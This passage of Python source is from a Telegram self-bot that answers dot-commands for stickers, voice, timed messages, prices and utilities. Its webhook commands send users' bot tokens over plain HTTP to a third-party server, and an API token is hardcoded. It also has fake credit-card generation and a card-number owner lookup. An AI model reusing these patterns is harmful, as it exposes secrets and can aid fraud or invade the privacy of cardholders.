    m.edit_text(f"""𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱\n❖ ғɪʟᴇ ɴᴀᴍᴇ : `{filename}`\n❖ ғɪʟᴇsɪᴢᴇ : `{total/1024/1024:.3f} ᴍʙ`\n❖ ᴛɪᴍᴇ : `{datetime.now(timezone("Asia/Tehran")).strftime("%H:%M")}`\nㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ\n❖ ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇᴅ\n❖ ᴡᴀɪᴛ ғᴏʀ ᴜᴘʟᴏᴀᴅ""")
    app.send_document(m.chat.id , f"{filename}" , caption=f"""𝗨𝗽𝗹𝗼𝗮𝗱\n❖ ғɪʟᴇ ɴᴀᴍᴇ : `{filename}`\n❖ ғɪʟᴇsɪᴢᴇ : `{total/1024/1024:.3f} ᴍʙ`\n❖ ᴛɪᴍᴇ : `{datetime.now(timezone("Asia/Tehran")).strftime("%H:%M")}`""")
    app.delete_messages(m.chat.id , m.id)
    os.remove(filename)
  except:
   m.edit_text(f"❖ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ ʟɪɴᴋ ɪs ɴᴏᴛ ᴅᴏᴡɴʟᴏᴀᴅᴀʙʟᴇ")
 
# elif text.startswith(".ytdl"):
#  try:
#   link = (m.reply_to_message.text if m.reply_to_message else text.split()[1])
#   app.edit_message_text(m.chat.id , m.id , "❖ Download Started")
#   ydl_opts = {}
#   with YoutubeDL(ydl_opts) as ydl:
#     yt = ydl.download([link])
#   app.edit_message_text(m.chat.id , m.id , "❖ Download Completed") 
#   app.send_document(m.chat.id , yt)
#   os.remove(yt)
#   app.edit_message_text(m.chat.id , m.id , "❖ Upload Completed") 
#  except Exception as er:
#   m.edit_text(f"❖ Download Failed !! \n`ERROR` ⤳\n(`{er}`)")   

 elif text.startswith(".sticker"):
  try:
   im = Image.open(GET(f"http://www.flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=colgate-logo&&text={text.replace('.sticker' , '')[1::]}&fontsize=100", stream=True).raw) 
   im.save('sticker.png')
   os.rename('sticker.png' ,'sticker.webp')
   app.send_sticker(m.chat.id , f"sticker.webp" , reply_to_message_id=m.id)
   os.remove(f"sticker.webp")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   

 elif text == ".sticker2":
  try:
   kobs = datetime.now(timezone("Asia/Tehran")).strftime("%H:%M:%S")
   im = Image.open(GET(f"https://bcassetcdn.com/asset/logo/e7b2b2cb-aed9-4ca2-b4bc-61d4414d891b/logo?v=4&text={kobs}"))
   im.save('sticker.png')
   os.rename('sticker.png' ,'sticker.webp')
   app.send_sticker(m.chat.id , f"sticker.webp" , reply_to_message_id=m.id)
   os.remove(f"sticker.webp")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
   
 elif text.startswith(".error"):
  try:
   imn = Image.open(GET(f"http://http.cat/{text.replace('.error' , '')[1::]}.jpg", stream=True).raw) 
   imn.save('sticker.jpg')
   os.rename('sticker.jpg' ,'sticker.webp')
   app.send_sticker(m.chat.id , f"sticker.webp" , reply_to_message_id=m.id)
   os.remove(f"sticker.webp")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   

 elif m.text == ".get_message":
  if m.reply_to_message:
   app.send_message(m.chat.id , m.reply_to_message, reply_to_message_id=m.id)
  else:
   app.send_message(m.chat.id , m, reply_to_message_id=m.id)
 
 elif m.text == ".time":
  try:
    for i in range(0,10):
      kir = datetime.now(timezone("Asia/Tehran")).strftime("%H:%M:%S")
      app.edit_message_text(m.chat.id , m.id , f"**Time:** `{kir}`")
      sleep(1)
  except Exception as er:
   m.edit_text(er)
 
 elif m.text == ".timepic":
  try:
   image.save('time_image.jpg')
   file_path = 'sticker.webp'
   os.rename('time_image.jpg', file_path)
   app.send_sticker(m.chat.id, file_path, reply_to_message_id=m.id)
   os.remove(file_path)
  except Exception as er:
   m.edit_text(er)
#__________________________Send comment at a number______________
 elif text.startswith(".send_coment"):
   t = text.replace(".send_coment", "")[1::]
   sending_text = (read("send_time_text.txt") if read("send_time_text.txt") != None else ".")
   app.delete_messages(m.chat.id , m.id)
   app.send_message("me" , f"❖ I Will Send [`{sending_text}`] at {t} Comment \n\n__In This Chat:__ [`{m.chat.id}`] ")
   chait = m.reply_to_message.chat.id
   mesig = m.reply_to_message
   while True:
      count = app.get_discussion_replies_count(chait, mesig.id)
      sleep(0.1)
      if int(count) >= (int(t) - 1):
        app.send_message(m.chat.id , sending_text, reply_to_message_id=(mesig.id if mesig else m.id))
        break

 elif text.startswith(".coment_text"):
   if m.reply_to_message.text:
     fileud = m.reply_to_message.text
     write("send_time_text.txt" , fileud)
     m.edit_text(f"❖ The Message Of [ `.send_coment` ] is {fileud}")
   else:
     m.edit_text(f"❖ Please Reply To A Text Message")
   
#__________________________Sending Message At A Time______________
 elif text.startswith(".text_time"):
   t = text.replace(".text_time", "")[1::]
   sending_time = have_sec(t)
   sending_text = (read("send_time_text.txt") if read("send_time_text.txt") != None else ".")
   app.delete_messages(m.chat.id , m.id)
   app.send_message("me" , f"❖ I Will Send [`{sending_text}`] At [**{sending_time}**]\n\n__In This Chat:__ [`{m.chat.id}`]")
   while True:
      a = datetime.now(timezone("Asia/Tehran")).strftime("%H:%M:%S")
      if sending_time == a:
        app.send_message(m.chat.id , sending_text, reply_to_message_id=(reply_to_message.id if m.reply_to_message else m.id))
        sending_time = ""
        break

 elif text.startswith(".photo_time"):
   sending_time = text.replace(".photo_time", "")[1::]+":00"
   sending_text = read("send_time_photo.txt")
   app.delete_messages(m.chat.id , m.id)
   down = app.download_media(sending_text)
   app.send_message("me" , f"❖ I Will Send photo At [**{sending_time}**]\n\n__In This Chat:__ [`{m.chat.id}`]")
   while True:
      a = datetime.now(timezone("Asia/Tehran")).strftime("%H:%M:%S")
      if sending_time == a:
        app.send_photo(m.chat.id , down , reply_to_message_id=(reply_to_message.id if m.reply_to_message else m.id))
        sending_time = ""
        break

 elif text.startswith(".text_send_time"):
   if m.reply_to_message.text:
     fileud = m.reply_to_message.text
     write("send_time_text.txt" , fileud)
     m.edit_text(f"❖ The Message Of [ `.text_time` ] is {fileud}")
   else:
     m.edit_text(f"❖ Please Reply To A Text Message")
   
 elif text.startswith(".photo_send_time"):
   if m.reply_to_message.photo:
     fileud = m.reply_to_message.photo.file_id
     write("send_time_photo.txt" , fileud)
     m.edit_text(f"❖ The Photo Of [ `.photo_time` ]👇\n\nFile id: {fileud}")
   else:
     m.edit_text(f"**❖ Please reply to a photo**")

#________________________Server_info________________________________
 elif text == ".ping":
  try:
    up_a = (strftime('%H:%M:%S', gmtime(uptime())))
    svmem = virtual_memory()
    app.edit_message_text(m.chat.id , m.id , f"""
    **WenosSelf Status**
    
❖ `User` ⤳ ( `{app.get_me().first_name}` )
❖ `Uptime` ⤳ (`{up_a}`)
❖ `Ram Usage` ⤳ (`{get_size(svmem.used)}`)
❖ `Python Version` ⤳ (`{python_version()}`)
❖ `Source Version` ⤳ (`{Src_vrsion}`) 
❖ `Library` ⤳ (`Pyrogram`)""")
  except Exception as er:
   m.edit_text(er)

 elif text == ".cpu":
  try:
    cpufreq = cpu_freq()
    app.edit_message_text(m.chat.id , m.id , f"""
❖ `Physical Cores` ⤳  (`{cpu_count(logical=False)}`)
❖ `Total Cores` ⤳  (`{cpu_count(logical=True)}`)
❖ `Max Frequency` ⤳  (`{cpufreq.max:.2f}Mhz`)
❖ `Min Frequency` ⤳  (`{cpufreq.min:.2f}Mhz`)
❖ `Cuttent Frequency` ⤳  (`{cpufreq.current:.2f}Mhz`)
❖ `CPU Usage` ⤳  (`{cpu_percent()}%`)""")
  except Exception as er: 
   m.edit_text(er)

 elif text == ".memory":
  try:
    svmem = virtual_memory()
    app.edit_message_text(m.chat.id , m.id , f"""
❖ `Total` ⤳ (`{get_size(svmem.total)}`)
❖ `Available` ⤳ (`{get_size(svmem.available)}`)
❖ `Used` ⤳ (`{get_size(svmem.used)}`)
❖ `Percentage` ⤳ (`{svmem.percent}%`)""")
  except Exception as er:
   m.edit_text(er)

 elif text == ".system-inf":
  try:
    kirithokhmi = uname()
    app.edit_message_text(m.chat.id , m.id , f"""
❖ `System` ⤳ (`{kirithokhmi.system}`)
❖ `Node Name` ⤳ (`{kirithokhmi.node}`)
❖ `Release` ⤳ (`{kirithokhmi.release}`)
❖ `Version` ⤳ (`{kirithokhmi.version}`)
❖ `Machine` ⤳ (`{kirithokhmi.machine}`)
❖ `Processor` ⤳ (`{kirithokhmi.processor}`)""") 
  except Exception as er:
   m.edit_text(er)
#________________________End________________________________
 elif text.startswith(".voice"):
  try:
   audio = gTTS(text=text.replace(".voice","")[1::] , lang='en')
   audio.save("voice.ogg")
   app.send_audio(m.chat.id , "voice.ogg", caption="◤✧Function: Text to Voice◥\n◣✧Language:English Lang◢")
   os.remove(f"voice.ogg")
   
   audio2 = gTTS(text=text.replace(".voice","")[1::] , lang='fr')
   audio2.save("voice2.ogg")
   app.send_audio(m.chat.id , "voice2.ogg", caption="◤✧Function: Text to Voice◥\n◣✧Language:French lang◢")
   os.remove(f"voice2.ogg")
   
   audio3 = gTTS(text=text.replace(".voice","")[1::] , lang='es')
   audio3.save("voice3.ogg")
   app.send_audio(m.chat.id , "voice3.ogg", caption="◤✧Function: Text to Voice◥\n◣✧Language:Spanish Lang◢")
   os.remove(f"voice3.ogg")
   
   audio4 = gTTS(text=text.replace(".voice","")[1::] , lang='pt')
   audio4.save("voice4.ogg")
   app.send_audio(m.chat.id , "voice4.ogg", caption="◤✧Function: Text to Voice◥\n◣✧Language:Portuguese Lang◢")
   os.remove(f"voice4.ogg")
   
   audio5 = gTTS(text=text.replace(".voice","")[1::] , lang='zh-TW')
   audio5.save("voice5.ogg")
   app.send_audio(m.chat.id , "voice5.ogg", caption="◤✧Function: Text to Voice◥\n◣✧Language:Chinese Lang◢")
   os.remove(f"voice5.ogg")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")  
#-------------crush--------------------------------------------
 elif text.startswith(".crush"):
  try:
    audio6 = gTTS(text=text.replace(".crush","")[1::] , lang='zh-CN')
    audio6.save("voice6.ogg")
    app.send_audio(m.chat.id , "voice6.ogg")
    app.delete_messages(m.chat.id , m.id)
    os.remove(f"voice6.ogg")
  except Exception as er:
    m.edit_text(f"❖ **ERROR** :\n(`{er}`)")  
#---------------test------------------------------------------
 elif text == "proxy":
  try:
    url = "http://mohammadali.kavir-host-sub.ir/api/telproxy.php"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    server=ms["connect"]
    proxy="اطلاعات پروکسي توليد شده شما : \n"+server
    app.send_message(m.chat.id ,proxy, reply_to_message_id=m.id)
  except:
    app.send_message(m.chat.id ,"خطا در دريافت پروکسي لطفا دوباره تلاش کنيد", reply_to_message_id=m.id)

#----------------joke----------------------------------------
 elif text == ".joke":
  try:
    url2 = "https://one-api.ir/joke/?token=257767:6565c68b902f2"
    response = requests.get(url2)
    html_output = response.text
    ms=json.loads(html_output)
    joke = ms["result"]
    msg=f"**JOKE**▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n`{joke}`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬**JOKE**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text == ".tech":
  try:
    url2 = "https://techy-api.vercel.app/api/text"
    response = requests.get(url2)
    html_output = response.text
    ms=json.loads(html_output)
    joke = ms["message"]
    msg=f"**TECH**▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n`{joke}`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬**TECH**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#------------------------quote---------------------------------
 elif text == ".know" or text == "know":
  try:
    url = f"https://one-api.ir/danestani/?token=257767:6565c68b902f2"
    response = requests.get(url)
    html_output = response.text
    mmm1=json.loads(html_output)
    image = mmm1["result"]
    mmm2=json.dumps(image)
    mmm3=json.loads(mmm2)
    Content=mmm3["Content"]
    msg=f"**DANESTANI**▬▬▬▬▬▬▬▬▬\n`{Content}`\n▬▬▬▬▬▬▬▬▬**DANESTANI**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#------------------------mail-----------------------------------
 elif text == ".mail" or text == "mail":
  try:
    url = f"http://mizban-self.ir/self/py-web/fake/Fake.php?method=getNewMail"
    response = requests.get(url)
    html_output = response.text
    mmm1=json.loads(html_output)
    Content1 = mmm1["results"]
    mmm2=json.dumps(Content1)
    mmm3=json.loads(mmm2)
    Content=mmm3["email"]
    msg=f"**Fake mail**▬▬▬▬▬▬▬▬▬\n**`{Content}`**\n▬▬▬▬▬▬▬▬▬\nدریافت پیام های inbox : \n`.checkmail Address`\nترجیحا 2 دقیقه پس از دریافت ایمیل\n▬▬▬▬▬▬▬▬▬**Fake mail**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".checkmail "):
  try:
    text=text.replace('.checkmail ','')
    url = f"http://mizban-self.ir/self/py-web/fake/Fake.php?method=getMessages&email={text}"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    image = ms["results"]
    img=image[0]
    mm=json.dumps(img)
    mm1=json.loads(mm)
    Content=mm1["from"]
    Content1=mm1["to"]
    Content2=mm1["subject"]
    Content3=mm1["body_text"]
    Content4=mm1["created_at"]
    Content5=mm1["id"]
    Content6=mm1["attachments"]
    msg=f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❖**Email** = `{text}` \n❖**INBOX**:\n**from** =`{Content}` \n**to** = `{Content1}`\n**subject = `{Content2}`\n **text** = `{Content3}`\n **date** = `{Content4}`\n**id** = `{Content5}`\n**attachments** = `{Content6}`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 #-------------------------------fake card----------------------------
 elif text == ".card" or text == "card":
  try:
    url = f"http://mizban-self.ir/self/py-web/card/fake.php"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    mm6 = mm1["results"]
    mm7=mm6["name"]
    mm8=mm6["family"]
    mm9=mm6["address"]
    mm10=mm6["city"]
    mm11=mm6["state"]
    mm12=mm6["p-code"]
    mm13=mm6["country"]
    mm14=mm6["age"]
    mm15=mm6["c-type"]
    mm16=mm6["c-number"]
    mm17=mm6["cvv2"]
    mm18=mm6["c-expire"]
    msg=f"**Fakecard**\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**❖Name **= `{mm7}` \n**❖Family**: `{mm8} `\n**❖Address **: `{mm9}`**❖city **= {mm10} \n **❖State **: {mm11}\n**❖p-code **= `{mm12}`\n**❖country **= `{mm13}`\n**❖age **= `{mm14}`\n**❖c-type **= `{mm15}`\n**❖c-number **= `{mm16}`\n**❖cvv2 **= `{mm17}`\n**❖c-expire **= `{mm18}`\n▬▬▬▬▬▬▬▬▬▬**Fakecard**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#------------------------know---------------------------------
 elif text == ".quote" or text == "quote":
  try:
    url = f"https://one-api.ir/sokhan/?token=257767:6565c68b902f2&action=random"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    image = mm1["result"]
    mm2=json.dumps(image)
    mm3=json.loads(mm2)
    quote=mm3["text"]
    author=mm3["author"]
    msg=f"**QUOTE**▬▬▬▬▬▬▬▬▬▬▬▬▬\n`{quote}`\n**Author**: `{author}`\n▬▬▬▬▬▬▬▬▬▬▬▬**QUOTE**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#--------------------------trx---------------------------------
 elif text == ".trx" or text == "trx":
  try:
    url = f"https://api.nobitex.ir/market/stats?srcCurrency=usdt,trx,ton,btc,shib,eth,etc,usdt,ada,bch,ltc,bnb&dstCurrency=irt,usdt"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    image = mm1["stats"]
    mm2=json.dumps(image)
    mm3=json.loads(mm2)
    mm4=mm3["trx-irt"]
    mm5=json.dumps(mm4)
    mm6=json.loads(mm5)
    mm7=mm6["bestSell"]
    mm8=mm6["bestBuy"]
    mm9=mm6["dayLow"]
    mm10=mm6["dayHigh"]
    mm11=mm6["dayChange"]
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❖Name = ❖TRX / TRON / ❖ترون\n❖TRX-(بهترین خرید) = `{mm8}`ریال\n❖TRX-(بهترین فروش) = `{mm7}`ریال\n❖TRX-(بیشترین قیمت) = `{mm10}`ریال\n❖TRX-(کمترین قیمت) = `{mm9}`ریال\n❖TRX-(تغییرات) = `{mm11}` %\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
#-----------------------------price--------------------------    
 elif text.startswith(".qeymat "):
  try:
    text=text.replace('.qeymat ','')
    url = f"https://one-api.ir/torob/?token=257767:6565c68b902f2&action=search&q={text}&page=1"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    image = ms["result"]
    img=image[0]
    mm=json.dumps(img)
    mm1=json.loads(mm)
    name1=mm1["name1"]
    name2=mm1["name2"]
    price=mm1["price_text"]
    image=mm1["image_url"]
    shop=mm1["shop_text"]
    msg=f"#Torob\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**❖Name **= `{name1}` \n**❖Price **: `{price} `\n**❖Shop **: `{shop}` \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**❖Name **= {name2} \n **❖Image **: {image}"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".price"):
  try:
    text=text.replace('.price ','')
    price = torb(text)
    m.reply_photo(price[2], caption = f"#Basalam\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**{price[0]}\n\nقیمت : {price[1]}**تومان\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n")
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#-------------------------------poem----------------------------
 elif text == ".poem" or text == "poem":
  try:
    url = f"https://one-api.ir/hafez/?token=257767:6565c68b902f2"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    image = mm1["result"]
    mm2=json.dumps(image)
    mm3=json.loads(mm2)
    mm7=mm3["RHYME"]
    msg=f"**POEM**▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n`{mm7}`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬**POEM**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#------------------------------number-------------------------
 elif text.startswith(".num "):
  try:
    text=text.replace('.num ','')
    url = f"https://api.codebazan.ir/num/?num={text}"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    ms2 = ms["result"]
    mm=json.dumps(ms2)
    mm1=json.loads(mm)
    name1=mm1["num"]
    msg=f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❖**NumbER** = `{text}` \n❖**Persian**:\n`{name1}` \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".estelam "):
  try:
    text=text.replace('.estelam ','')
    url = requests.get(f"https://my.tabdilcard.com/api/api/v1/provider/preview?number={text}&type=2&bank=017").json()
    name1=url["name"]
    name2=url["bankname"]
    msg=f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❖**Card NumbER** = `{text}` \n❖**Name**:\n`{name1}` \n**Bank Name** = `{name2}`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".tara "):
    try:
        input_text = text.replace('.tara ', '')
        extracted_text = extract_transaction_link(input_text)
        url = requests.get('http://mizban-self.ir/self/py-web/tara/tara.php', params={'hash': extracted_text}).json()
        url2 = requests.get('https://apilist.tronscan.org/api/transaction-info', params={'hash': extracted_text}).json()
        name1 = url["amount"]
        name2 = url["owner_address"]
        name3 = url["to_address"]
        name4 = url["date"]
        name5 = url["time"]
        name6 = url2['contractRet']
        name7 = url2['cost']['net_fee_cost']/1000
        msg = f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**❖Status** =   `{name6}`\n**❖Amount** =   `{name1}` \n**❖From** = \n`{name2}`\n**❖To** = \n`{name3}`\n**❖Date** =   `{name4}`\n**❖Time** =   `{name5}`\n**❖Fee** = `{name7}`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
        app.send_message(m.chat.id, msg, reply_to_message_id=m.id)
    except Exception as er:
        app.send_message(m.chat.id, f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
#------------------------------link---------------------------
 elif text.startswith(".link "):
  try:
    text=text.replace('.link ','')
    url = f"https://api.codebazan.ir/shortlink/?url={text}"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    ms2 = ms["result"]
    mm=json.dumps(ms2)
    mm1=json.loads(mm)
    name1=mm1["cutt"]
    msg=f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❖**Link** = `{text}` \n❖**Short Link **: `{name1}` \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n توجه کنید که لینک ارسالی باید دارای https:// باشد\n در غیر این صورت از دستور .link2 استفاده کنید. \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".link2 "):
  try:
    text=text.replace('.link2 ','')
    url = f"https://api.codebazan.ir/shortlink/?url=https://{text}"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    ms2 = ms["result"]
    mm=json.dumps(ms2)
    mm1=json.loads(mm)
    name1=mm1["cutt"]
    msg=f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❖**Link** = `{text}` \n❖**Short Link **: `{name1}` \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n توجه کنید که لینک ارسالی باید فاقد https:// باشد\n در غیر این صورت از دستور .link1 استفاده کنید. \n {er}", reply_to_message_id=m.id)
#------------------------------gif------------------------
 elif text.startswith(".gif "):
  try:
    text=text.replace('.gif ','')
    gif(text)
    app.send_animation(m.chat.id, "proxy_form.gif", f"**گیف شما آماده شد** \nگیف درخواستی : `{text}`", reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)

#------------------------------logo------------------------
 elif text.startswith(".logo "):
  try:
    text=text.replace('.logo ','')
    logo(text)
    app.send_photo(m.chat.id, "logo.png", f"**لوگو شما آماده شد** \nلوگو درخواستی : `{text}`", reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".logo2 "):
  try:
    text=text.replace('.logo2 ','')
    logo2(text)
    app.send_photo(m.chat.id, "logo.png", f"**لوگو شما آماده شد** \nلوگو درخواستی : `{text}`", reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".lg "):
  try:
    text=text.split(" ")
    logo3(text[1], text[2])
    app.send_photo(m.chat.id, "logo.png", f"**Your Logo is Ready!**\n**Logo** : `{text[1]}`", reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)

 elif text.startswith(".cron "):
  try:
    text=text.split(" ")
    url1=text[1]
    time=text[2]
    url = f"http://mizban-self.ir/self/py-web/cron/cron.php?url={url1}&time={time}"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    image = mm1["results"]
    mmm2=json.dumps(image)
    mmm3=json.loads(mmm2)
    Content=mmm3["message"]
    msg=f"**CRON-JOB**▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❖**Link** = `{url1}` \n❖**Time**: `{time}`  __min__\n❖**STATUS** = `{Content}` \n▬▬▬▬▬▬▬▬**CRON-JOB**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#-------------------------webhook-----------------------------------
 elif text.startswith(".setwebhook "):
  try:
    text=text.split(" ")
    token=text[1]
    url1=text[2]
    url = f"http://mizban-self.ir/self/py-web/webhook/api.php?type=setwebhook&token={token}&url={url1}"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    msg=f"**SET-WEBHOOK**▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❖TOKEN = `{token}`\n\nURL =  `{url1}`\n\n**Result = ** __{mm1}__\n▬▬▬▬▬▬▬▬**SET-WEBHOOK**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".delwebhook "):
  try:
    token=text.replace('.delwebhook ','')
    url = f"http://mizban-self.ir/self/py-web/webhook/api.php?type=deletewebhook&token={token}"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    msg=f"**DELETE-WEBHOOK**▬▬▬▬▬▬▬▬\n❖TOKEN = `{token}`\n\n**Result = ** __{mm1}__\n▬▬▬▬▬▬▬▬**DELETE-WEBHOOK**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".delupdate "):
  try:
    token=text.replace('.delupdate ','')
    url = f"http://mizban-self.ir/self/py-web/webhook/api.php?type=deleteupdate&token={token}"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    msg=f"**DELETE-UPDATE**▬▬▬▬▬▬▬▬\n❖TOKEN = `{token}`\n\n**Result = ** __{mm1}__\n▬▬▬▬▬▬▬▬**DELETE-UPDATE**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".webhookinfo "):
  try:
    token=text.replace('.webhookinfo ','')
    url = f"http://mizban-self.ir/self/py-web/webhook/api.php?type=webhookinfo&token={token}"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    img=mm1[0]
    mm=json.dumps(img)
    mm1=json.loads(mm)
    b=mm1["pending_update_count"]
    c=mm1["max_connections"]
    d=mm1["ip_address"]
    a=mm1["url"]
    msg=f"**WEBHOOK-INFO**▬▬▬▬▬▬▬▬\n❖TOKEN = `{token}`\n\n**URL = ** __{a}__\n\n**pending update count = ** __{b}__\n\n**max_connections = ** __{c}__\n\n**ip address = ** __{d}__\n▬▬▬▬▬▬▬▬**WEBHOOK-INFO**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".botinfo "):
  try:
    token=text.replace('.botinfo ','')
    url = f"http://mizban-self.ir/self/py-web/webhook/api.php?type=getme&token={token}"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    img=mm1[0]
